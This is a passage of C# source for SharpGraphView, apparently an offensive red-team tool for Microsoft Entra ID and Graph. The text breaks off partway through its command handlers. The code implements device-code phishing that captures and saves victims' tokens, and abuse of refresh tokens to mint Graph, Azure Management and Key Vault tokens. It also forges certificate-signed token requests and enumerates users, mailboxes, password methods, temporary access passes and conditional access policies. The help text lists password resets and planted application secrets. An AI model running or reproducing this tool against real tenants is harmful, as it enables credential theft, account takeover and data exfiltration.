using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography.X509Certificates;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;

namespace SharpGraphView
{
    class SharpGraphView
    {
        public static void ShowHelp()
        {
            Console.WriteLine(
@"
SharpGraphView by @mlcsec

Usage:

    SharpGraphView.exe [Method] [-Domain <domain>] [-Tenant <tenant id>] [-Id <object id>] [-Select <display property>] [-Query <api endpoint>] [-Search <string> -Entity <entity>] [-Token <access token>] [-Cert <pfx cert>]

Flags:

    -Token                                   - Microsoft Graph access token or refresh token for FOCI abuse
    -Cert                                    - X509Certificate path
    -Domain                                  - Target domain 
    -Tenant                                  - Target tenant ID
    -Id                                      - ID of target object
    -Select                                  - Filter output for comma seperated properties
    -Query                                   - Raw API query (GET request only)
    -Search                                  - Search string 
    -Entity                                  - Search entity [driveItem (OneDrive), message (Mail), chatMessage (Teams), site (SharePoint), event (Calenders)]
    -help                                    - Show help

Auth:

    Get-GraphTokens                          - Obtain graph token via device code phish (saved to graph_tokens.txt)
    Get-TenantID                             - Get tenant ID for target domain
    Invoke-RefreshToMSGraphToken             - Convert refresh token to Micrsoft Graph token (saved to new_graph_tokens.txt)
    Invoke-RefreshToAzureManagementToken     - Convert refresh token to Azure Management token (saved to az_tokens.txt)
    Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
    Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)

Post-Auth:

    Get-CurrentUser                          - Get current user profile
    Get-CurrentUserActivity                  - Get recent actvity and actions of current user

    Get-OrgInfo                              - Get information relating to the target organisation
    Get-Domains                              - Get domain objects 
    Get-User                                 - Get all users (default) or target user (-id)
    Get-UserProperties                       - Get current user properties (default) or target user (-id)
    Get-UserGroupMembership                  - Get group memberships for current user (default) or target user (-id)
    Get-UserTransitiveGroupMembership        - Get transitive group memberships for current user (default) or target user (-id)
    Get-Group                                - Get all groups (default) or target group (-id)
    Get-GroupMember                          - Get all members of target group
    Get-AppRoleAssignments                   - Get application role assignments for current user (default) or target user (-id)
    Get-ConditionalAccessPolicy              - Get conditional access policy properties
    Get-PersonalContacts                     - Get contacts of the current user
    Get-CrossTenantAccessPolicy              - Get cross tentant access policy properties 
    Get-PartnerCrossTenantAccessPolicy       - Get partner cross tenant access policy
    Get-UserChatMessages                     - Get all messages from all chats for target user
    Get-AdministrativeUnitMember             - Get members of administrative unit
    Get-OneDriveFiles                        - Get all accessible OneDrive files for current user (default) or target user (-id)
    Get-UserPermissionGrants                 - Get permissions grants of current user (default) or target user (-id)
    Get-oauth2PermissionGrants               - Get oauth2 permission grants for current user (default) or target user (-id)
    Get-Messages                             - Get all messages in signed-in user's mailbox (default) or target user (-id)
    Get-TemporaryAccessPassword              - Get TAP details for current user (default) or target user (-id) 
    Get-Password                             - Get passwords registered to current user (default) or target user (-id)
    
    List-AuthMethods                         - List authentication methods for current user (default) or target user (-id)
    List-DirectoryRoles                      - List all directory roles activated in the tenant
    List-Notebooks                           - List current user notebooks (default) or target user (-id)
    List-ConditionalAccessPolicies           - List conditional access policy objects
    List-ConditionalAuthenticationContexts   - List conditional access authentication context
    List-ConditionalNamedLocations           - List conditional access named locations
    List-SharePointRoot                      - List root SharePoint site properties
    List-SharePointSites                     - List any available SharePoint sites 
    List-ExternalConnections                 - List external connections
    List-Applications                        - List all Azure Applications
    List-ServicePrincipals                   - List all service principals
    List-Tenants                             - List tenants 
    List-JoinedTeams                         - List joined teams for current user (default) or target user (-id)
    List-Chats                               - List chats for current user (default) or target user (-id)
    List-Devices                             - List devices
    List-AdministrativeUnits                 - List administrative units
    List-OneDrives                           - List current user OneDrive (default) or target user (-id)
    List-RecentOneDriveFiles                 - List current user recent OneDrive files
    List-SharedOneDriveFiles                 - List OneDrive files shared with the current user

    Invoke-Search                            - Search for string within entity type (driveItem, message, chatMessage, site, event) 
    Find-PrivilegedRoleUsers                 - Find users with privileged roles assigned
    Invoke-CustomQuery                       - Custom GET query to target Graph API endpoint
    Update-UserPassword                      - Update the passwordProfile of the target user (NewUserS3cret@Pass!)
    Add-ApplicationPassword                  - Add client secret to target application
    Add-UserTAP                              - Add new Temporary Access Password (TAP) to target user

Examples:

    SharpGraphView.exe Get-GraphTokens
    SharpGraphView.exe Invoke-RefreshToAzureManagementToken -tenant <tenant id> -token <refresh token>
    SharpGraphView.exe Get-User -id john.doe@vulncorp.onmicrosoft.com -token .\token.txt -select displayname,id
    SharpGraphView.exe Get-UserGroupMembership -token eyJ0eXAiOiJKV1QiLC...
    SharpGraphView.exe List-RecentOneDriveFiles -token .\token.txt
    SharpGraphView.exe Invoke-Search -search ""password"" -entity driveItem -token eyJ0eXAiOiJKV1QiLC...
    SharpGraphView.exe Invoke-CustomQuery -Query ""https://graph.microsoft.com/v1.0/sites/{siteId}/drives"" -token .\token.txt
");
        }

        static string GetAccessToken(string arg)
        {
            if (File.Exists(arg))
            {
                return ReadTokenFromFile(arg);
            }
            else
            {
                return arg;
            }
        }

        static string ReadTokenFromFile(string filePath)
        {
            try
            {
                string token = File.ReadAllText(filePath);
                return token.TrimEnd();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error reading token from file: {ex.Message}");
                throw;
            }
        }

        static X509Certificate2 GetCertificate(string filePath)
        {
            try
            {
                // Load the certificate from file
                X509Certificate2 cert = new X509Certificate2(filePath);
                return cert;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error loading certificate from file: {ex.Message}");
                throw;
            }
        }

        static void ParseArgs(string[] args)
        {
            int iter = 0;

            foreach (string item in args)
            {
                switch (item)
                {
                    case "-token":
                    case "-Token":
                        Config.accessToken = GetAccessToken(args[iter + 1]);
                        break;
                    case "-cert":
                    case "-Cert":
                        Config.cert = GetCertificate(args[iter + 1]);
                        break;
                    case "-id":
                    case "iD":
                    case "-Id":
                    case "-ID":
                        Config.id = args[iter + 1];
                        break;
                    case "-select":
                    case "-Select":
                        Config.select = args[iter + 1];
                        break;
                    case "-query":
                    case "-Query":
                        Config.query = args[iter + 1];
                        break;
                    case "-domain":
                    case "-Domain":
                        Config.domain = args[iter + 1];
                        break;
                    case "-tenant":
                    case "-Tenant":
                        Config.tenant = args[iter + 1];
                        break;
                    case "-search":
                    case "-Search":
                        Config.searchString = args[iter + 1];
                        break;
                    case "-entity":
                    case "-Entity":
                        Config.entity = args[iter + 1];
                        break;
                    default:
                        break;
                }
                ++iter;
            }
        }

        static async Task Main(string[] args)
        {
            if (args.Length < 1)
            {
                ShowHelp();
                return;
            }

            if (args.Contains("-help"))
            {
                ShowHelp();
                return;
            }

            ParseArgs(args);
            string command = args[0];


            // Get-GraphTokens

            if (string.Equals(command, "Get-GraphTokens", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-GraphTokens");
                string clientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
                string resource = "https://graph.microsoft.com";
                // check other device types
                string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042";

                var body = new Dictionary<string, string>
            {
                { "client_id", clientId },
                { "resource", resource }
            };

                using (var httpClient = new HttpClient())
                {
                    httpClient.DefaultRequestHeaders.Add("User-Agent", $"{userAgent}");
                    HttpResponseMessage deviceCodeResponse = await httpClient.PostAsync("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0", new FormUrlEncodedContent(body));
                    string deviceCodeResponseContent = await deviceCodeResponse.Content.ReadAsStringAsync();

                    string deviceCode = null;
                    string message = null;
                    try
                    {
                        JObject deviceCodeJsonResponse = JObject.Parse(deviceCodeResponseContent);
                        deviceCode = (string)deviceCodeJsonResponse["device_code"];
                        message = (string)deviceCodeJsonResponse["message"];
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Failed to parse device code response: {ex.Message}");
                        return;
                    }

                    Console.WriteLine($"{message}\n");

                    await Task.Delay(3000);

                    var startTime = DateTime.Now;
                    var pollingDuration = TimeSpan.FromMinutes(15);
                    var lastAuthorizationPendingTime = DateTime.MinValue;

                    while (DateTime.Now - startTime < pollingDuration)
                    {
                        var tokenBody = new Dictionary<string, string>
                        {
                            { "client_id", clientId },
                            { "grant_type", "urn:ietf:params:oauth:grant-type:device_code" },
                            { "code", deviceCode }
                        };

                        HttpResponseMessage tokenResponse = await httpClient.PostAsync("https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0", new FormUrlEncodedContent(tokenBody));
                        string tokenResponseContent = await tokenResponse.Content.ReadAsStringAsync();

                        if (tokenResponse.StatusCode == HttpStatusCode.BadRequest)
                        {
                            if (DateTime.Now - lastAuthorizationPendingTime >= TimeSpan.FromMinutes(1))
                            {
                                Console.WriteLine("[*] authorization_pending");
                                lastAuthorizationPendingTime = DateTime.Now;
                            }
                            await Task.Delay(3000);
                        }
                        else if (!tokenResponse.IsSuccessStatusCode || tokenResponseContent.Contains("authorization_pending"))
                        {
                            // continue polling
                            await Task.Delay(3000);
                        }
                        else
                        {
                            JObject tokenJson = JObject.Parse(tokenResponseContent);
                            Console.WriteLine("\n[+] Token Obtained!");

                            foreach (var property in tokenJson.Properties())
                            {
                                Console.WriteLine($"[*] {property.Name}: {property.Value}");
                            }

                            // save to file
                            string filePath = "graph_tokens.txt";
                            using (StreamWriter writer = File.AppendText(filePath))
                            {
                                writer.WriteLine($"[+] Token Obtained! ({DateTime.Now})");
                                foreach (var property in tokenJson.Properties())
                                {
                                    writer.WriteLine($"[*] {property.Name}: {property.Value}");
                                }
                                writer.WriteLine();
                            }
                            Console.WriteLine($"\n[+] Token information written to '{filePath}'.");

                            return;
                        }
                    }
                    Console.WriteLine("[-] Polling expired. Token not obtained.");
                }
            }


            // Get-TenantID

            if (string.Equals(command, "Get-TenantID", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.domain))
                {
                    Console.WriteLine("\n[!] No domain supplied");
                    Console.WriteLine("SharpGraphView.exe Get-TenantID -domain <target.domain>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Get-TenantID");

                    using (HttpClient client = new HttpClient())
                    {
                        try
                        {
                            var response = await client.GetAsync($"https://login.microsoftonline.com/{Config.domain}/.well-known/openid-configuration");
                            response.EnsureSuccessStatusCode();

                            var responseContent = await response.Content.ReadAsStringAsync();

                            var openIdConfig = Newtonsoft.Json.JsonConvert.DeserializeObject<dynamic>(responseContent);
                            var tenantId = openIdConfig.authorization_endpoint.ToString().Split('/')[3];

                            Console.WriteLine(tenantId);
                        }
                        catch (HttpRequestException ex)
                        {
                            Console.WriteLine($"[!] Error retrieving OpenID configuration: {ex.Message}");
                        }
                    }
                }
            }


            // Invoke-RefreshToMSGraphToken

            if (string.Equals(command, "Invoke-RefreshToMSGraphToken", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.accessToken) || string.IsNullOrEmpty(Config.tenant))
                {
                    Console.WriteLine("\n[!] No token or tenant supplied");
                    Console.WriteLine("SharpGraphView.exe Invoke-RefreshToMSGraphToken -tenant <tenant id> -token <refresh token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Invoke-RefreshToMSGraphToken");

                    string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042";
                    string ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
                    string refreshToken = $"{Config.accessToken}";
                    string Resource = "https://graph.microsoft.com/";
                    string authUrl = $"https://login.microsoftonline.com/{Config.tenant}";

                    // check other device types
                    var headers = new Dictionary<string, string>();
                    headers["User-Agent"] = UserAgent;

                    var body = new Dictionary<string, string>
                    {
                        { "resource", Resource },
                        { "client_id", ClientId },
                        { "grant_type", "refresh_token" },
                        { "refresh_token", refreshToken },
                        { "scope", "openid" }
                    };

                    using (HttpClient client = new HttpClient())
                    {
                        var content = new FormUrlEncodedContent(body);
                        foreach (var header in headers)
                        {
                            client.DefaultRequestHeaders.Add(header.Key, header.Value);
                        }

                        var response = await client.PostAsync($"{authUrl}/oauth2/token?api-version=1.0", content);
                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("\n[+] Token Obtained!");

                            var tokenResponse = await response.Content.ReadAsStringAsync();
                            JObject tokenJson = JObject.Parse(tokenResponse);

                            foreach (var property in tokenJson.Properties())
                            {
                                Console.WriteLine($"[*] {property.Name}: {property.Value}");
                            }

                            // save to file
                            string filePath = "new_graph_tokens.txt";
                            using (StreamWriter writer = File.AppendText(filePath))
                            {
                                writer.WriteLine($"[+] Token Obtained! ({DateTime.Now})");
                                foreach (var property in tokenJson.Properties())
                                {
                                    writer.WriteLine($"[*] {property.Name}: {property.Value}");
                                }
                                writer.WriteLine();
                            }
                            Console.WriteLine($"\n[+] Token information written to '{filePath}'.");
                        }
                        else
                        {
                            Console.WriteLine($"[-] Failed to get Microsoft Graph token: {response.ReasonPhrase}");
                        }
                    }
                }
            }


            // Invoke-RefreshToAzureManagementToken

            if (string.Equals(command, "Invoke-RefreshToAzureManagementToken", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.accessToken) || string.IsNullOrEmpty(Config.tenant))
                {
                    Console.WriteLine("\n[!] No token or tenant supplied");
                    Console.WriteLine("SharpGraphView.exe Invoke-RefreshToAzureManagementToken -tenant <tenant id> -token <refresh token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Invoke-RefreshToAzureManagementToken");

                    string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042";
                    string ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
                    string refreshToken = $"{Config.accessToken}";
                    string Resource = "https://management.azure.com/";
                    string authUrl = $"https://login.microsoftonline.com/{Config.tenant}";

                    // add/check other device types
                    var headers = new Dictionary<string, string>();
                    headers["User-Agent"] = UserAgent;

                    var body = new Dictionary<string, string>
                    {
                        { "resource", Resource },
                        { "client_id", ClientId },
                        { "grant_type", "refresh_token" },
                        { "refresh_token", refreshToken },
                        { "scope", "openid" }
                    };

                    using (HttpClient client = new HttpClient())
                    {
                        var content = new FormUrlEncodedContent(body);
                        foreach (var header in headers)
                        {
                            client.DefaultRequestHeaders.Add(header.Key, header.Value);
                        }

                        var response = await client.PostAsync($"{authUrl}/oauth2/token?api-version=1.0", content);
                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("\n[+] Token Obtained!");

                            var tokenResponse = await response.Content.ReadAsStringAsync();
                            JObject tokenJson = JObject.Parse(tokenResponse);

                            foreach (var property in tokenJson.Properties())
                            {
                                Console.WriteLine($"[*] {property.Name}: {property.Value}");
                            }

                            // save to file
                            string filePath = "az_tokens.txt";
                            using (StreamWriter writer = File.AppendText(filePath))
                            {
                                writer.WriteLine($"[+] Token Obtained! ({DateTime.Now})");
                                foreach (var property in tokenJson.Properties())
                                {
                                    writer.WriteLine($"[*] {property.Name}: {property.Value}");
                                }
                                writer.WriteLine();
                            }
                            Console.WriteLine($"\n[+] Token information written to '{filePath}'.");
                        }
                        else
                        {
                            Console.WriteLine($"[-] Failed to get Azure Management token: {response.ReasonPhrase}");
                        }
                    }
                }
            }


            // Invoke-RefreshToVaultToken

            if (string.Equals(command, "Invoke-RefreshToVaultToken", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.accessToken))
                {
                    Console.WriteLine("\n[!] No token supplied");
                    Console.WriteLine("SharpGraphView.exe Invoke-RefreshToVaultToken -tenant <tenant id>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Invoke-RefreshToVaultToken");

                    string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042";
                    string ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
                    string refreshToken = $"{Config.accessToken}";
                    string scope = "https://vault.azure.net/.default";

                    // add/check other device types
                    var headers = new Dictionary<string, string>();
                    headers["User-Agent"] = UserAgent;

                    var body = new Dictionary<string, string>
                    {
                        { "client_id", ClientId },
                        { "grant_type", "refresh_token" },
                        { "refresh_token", refreshToken },
                        { "scope", scope }
                    };

                    using (HttpClient client = new HttpClient())
                    {
                        var content = new FormUrlEncodedContent(body);
                        foreach (var header in headers)
                        {
                            client.DefaultRequestHeaders.Add(header.Key, header.Value);
                        }

                        var response = await client.PostAsync("https://login.microsoftonline.com/common/oauth2/v2.0/token", content);
                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("\n[+] Token Obtained!");

                            var tokenResponse = await response.Content.ReadAsStringAsync();
                            JObject tokenJson = JObject.Parse(tokenResponse);

                            foreach (var property in tokenJson.Properties())
                            {
                                Console.WriteLine($"[*] {property.Name}: {property.Value}");
                            }

                            // save to file
                            string filePath = "vault_tokens.txt";
                            using (StreamWriter writer = File.AppendText(filePath))
                            {
                                writer.WriteLine($"[+] Token Obtained! ({DateTime.Now})");
                                foreach (var property in tokenJson.Properties())
                                {
                                    writer.WriteLine($"[*] {property.Name}: {property.Value}");
                                }
                                writer.WriteLine();
                            }
                            Console.WriteLine($"\n[+] Token information written to '{filePath}'.");
                        }
                        else
                        {
                            Console.WriteLine($"[-] Failed to get Azure Vault token: {response.ReasonPhrase}");
                        }
                    }
                }
            }

            // Invoke-CertToAccessToken

            if (string.Equals(command, "Invoke-CertToAccessToken", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.tenant) || Config.cert == null || Config.id == null)
                {
                    Console.WriteLine("\n[!] No tenant or certificate supplied");
                    Console.WriteLine("SharpGraphView.exe Invoke-CertToAccessToken -tenant <tenant id> -cert <path_to_certificate> -id <appid>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Invoke-CertToAccessToken");

                    string tenantId = Config.tenant;
                    string clientId = Config.id;
                    X509Certificate2 cert = Config.cert;
                    string audience = $"https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token";

                    var handler = new JwtSecurityTokenHandler();
                    var descriptor = new SecurityTokenDescriptor
                    {
                        Issuer = clientId,
                        Subject = new ClaimsIdentity(new Claim[]
                        {
                            new Claim("sub", clientId)
                        }),
                        Audience = audience,
                        Expires = DateTime.UtcNow.AddMinutes(120),
                        SigningCredentials = new X509SigningCredentials(cert)
                    };

                    var token = handler.CreateJwtSecurityToken(descriptor);
                    var jwtToken = handler.WriteToken(token);

                    var httpClient = new HttpClient();
                    var content = new FormUrlEncodedContent(new[]
                    {
                        new KeyValuePair<string, string>("grant_type", "client_credentials"),
                        new KeyValuePair<string, string>("client_id", clientId),
                        new KeyValuePair<string, string>("client_assertion_type", "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"),
                        new KeyValuePair<string, string>("client_assertion", jwtToken),
                        new KeyValuePair<string, string>("scope", "https://graph.microsoft.com/.default")
                    });

                    var response = await httpClient.PostAsync($"https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token", content);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("\n[+] Token Obtained!");

                        var tokenResponse = await response.Content.ReadAsStringAsync();
                        JObject tokenJson = JObject.Parse(tokenResponse);

                        foreach (var property in tokenJson.Properties())
                        {
                            Console.WriteLine($"[*] {property.Name}: {property.Value}");
                        }

                        string filePath = "cert_tokens.txt";
                        using (StreamWriter writer = File.AppendText(filePath))
                        {
                            writer.WriteLine($"[+] Token Obtained! ({DateTime.Now})");
                            foreach (var property in tokenJson.Properties())
                            {
                                writer.WriteLine($"[*] {property.Name}: {property.Value}");
                            }
                            writer.WriteLine();
                        }
                        Console.WriteLine($"\n[+] Token information written to '{filePath}'.");
                    }
                    else
                    {
                        Console.WriteLine($"[-] Failed to get certificate access token: {response.ReasonPhrase}");
                    }
                }
            }


            // Post-Auth Methods

            if (string.Equals(command, "Get-CurrentUser", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-CurrentUser");
                string apiUrl = "https://graph.microsoft.com/v1.0/me";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }


            if (string.Equals(command, "Get-UserProperties", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-UserProperties");

                // loop through one by one
                // if grouped together e.g. ?$select=property1,property2... and one returns 403 
                // entire request fails
                foreach (var property in Config.properties)
                {
                    string apiUrl = string.IsNullOrEmpty(Config.id) ? $"https://graph.microsoft.com/v1.0/me?$select={property}" : $"https://graph.microsoft.com/v1.0/users/{Config.id}?$select={property}";

                    await GraphApiGET(Config.accessToken, apiUrl);
                }
            }

            if (string.Equals(command, "List-AuthMethods", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-AuthMethods");
                string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/authentication/methods" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/authentication/methods";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-OrgInfo", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-OrgInfo");
                string apiUrl = "https://graph.microsoft.com/v1.0/organization";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-Domains", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-Domains");
                string apiUrl = "https://graph.microsoft.com/v1.0/domains";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-User", StringComparison.CurrentCultureIgnoreCase))
            {
                string requestUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/users" : $"https://graph.microsoft.com/v1.0/users/{Config.id}";
                Console.WriteLine("\n[*] Get-User");

                if (!string.IsNullOrEmpty(Config.select))
                {
                    requestUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, requestUrl);
            }

            if (string.Equals(command, "Get-Group", StringComparison.CurrentCultureIgnoreCase))
            {
                string requestUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/groups" : $"https://graph.microsoft.com/v1.0/groups/{Config.id}";
                Console.WriteLine("\n[*] Get-Group");

                if (!string.IsNullOrEmpty(Config.select))
                {
                    requestUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, requestUrl);
            }


            if (string.Equals(command, "Get-TemporaryAccessPassword", StringComparison.CurrentCultureIgnoreCase))
            {
                string requestUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/authentication/temporaryAccessPassMethods" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/authentication/temporaryAccessPassMethods";
                Console.WriteLine("\n[*] Get-TemporaryAccessPassword");

                if (!string.IsNullOrEmpty(Config.select))
                {
                    requestUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, requestUrl);
            }

            if (string.Equals(command, "Get-Password", StringComparison.CurrentCultureIgnoreCase))
            {
                string requestUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/authentication/passwordMethods" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/authentication/passwordMethods";
                Console.WriteLine("\n[*] Get-Password");

                if (!string.IsNullOrEmpty(Config.select))
                {
                    requestUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, requestUrl);
            }

            if (string.Equals(command, "Get-UserGroupMembership", StringComparison.CurrentCultureIgnoreCase))
            {
                string requestUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/memberOf" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/memberOf";
                Console.WriteLine("\n[*] Get-UserGroupMembership");

                if (!string.IsNullOrEmpty(Config.select))
                {
                    requestUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, requestUrl);
            }

            if (string.Equals(command, "Get-UserTransitiveGroupMembership", StringComparison.CurrentCultureIgnoreCase))
            {
                string requestUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/transitiveMemberOf" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/transitiveMemberOf";
                Console.WriteLine("\n[*] Get-UserTransitiveGroupMembership");

                if (!string.IsNullOrEmpty(Config.select))
                {
                    requestUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, requestUrl);
            }


            if (string.Equals(command, "Get-GroupMember", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.id))
                {
                    Console.WriteLine("\n[!] No ID supplied");
                    Console.WriteLine("SharpMgGraph.exe Get-GroupMember -id <group id> -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Get-GroupMember");
                    string apiUrl = $"https://graph.microsoft.com/v1.0/groups/{Config.id}/members";

                    if (!string.IsNullOrEmpty(Config.select))
                    {
                        apiUrl += "?$select=" + Config.select;
                    }

                    await GraphApiGET(Config.accessToken, apiUrl);
                }
            }

            if (string.Equals(command, "List-DirectoryRoles", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-DirectoryRoles");
                string apiUrl = "https://graph.microsoft.com/v1.0/directoryRoles/";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-ConditionalAccessPolicies", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-ConditionalAccessPolicies");
                string apiUrl = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-ConditionalAuthenticationContexts", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-ConditionalAuthenticationContexts");
                string apiUrl = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/authenticationContextClassReferences";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-ConditionalNamedLocations", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-ConditionalNamedLocations");
                string apiUrl = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-ConditionalAccessPolicy", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.id))
                {
                    Console.WriteLine("\n[!] No ID supplied");
                    Console.WriteLine("SharpMgGraph.exe Get-ConditionalAccessPolicy -id <policy id> -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Get-ConditionalAccessPolicy");
                    string apiUrl = $"https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies/{Config.id}";

                    if (!string.IsNullOrEmpty(Config.select))
                    {
                        apiUrl += "?$select=" + Config.select;
                    }

                    await GraphApiGET(Config.accessToken, apiUrl);
                }
            }

            if (string.Equals(command, "List-SharePointSites", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-SharePointSites");
                string apiUrl = "https://graph.microsoft.com/v1.0/sites";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-SharePointRoot", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-SharePointRoot");
                string apiUrl = "https://graph.microsoft.com/v1.0/sites/root";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-Messages", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-Messages");

                string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/messages" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/messages";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-Notebooks", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-Notebooks");
                string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/onenote/notebooks" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/onenote/notebooks";

